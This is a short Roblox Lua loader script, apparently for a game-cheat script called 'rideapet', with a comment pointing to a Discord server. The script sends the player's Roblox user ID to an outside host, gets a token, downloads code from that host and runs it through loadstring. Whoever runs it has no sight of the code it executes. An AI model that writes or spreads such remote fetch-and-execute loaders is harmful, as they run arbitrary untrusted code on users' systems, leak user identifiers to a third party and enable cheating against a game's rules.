-- This file was generated at discord.gg/syncrypt

local LocalPlayer = game:GetService("Players").LocalPlayer
LocalPlayer = LocalPlayer and LocalPlayer.UserId or 0
local tick_ = tick
tick_ = tostring(tick_())

local response = game:HttpGet("https://scriptfarmer.dpdns.org/api/authtoken/generate?roblox_id=" .. tostring(LocalPlayer) .. "&cb=" .. tick_)

LocalPlayer = game:HttpGet("https://scriptfarmer.dpdns.org/code/rideapet?token=" .. response .. "&roblox_id=" .. tostring(LocalPlayer) .. "&cb=" .. tick_)
LocalPlayer, tick_ = loadstring(LocalPlayer)

if LocalPlayer then
	LocalPlayer()

	return
else
	warn("Failed to load script: " .. tostring(tick_))

	return
end
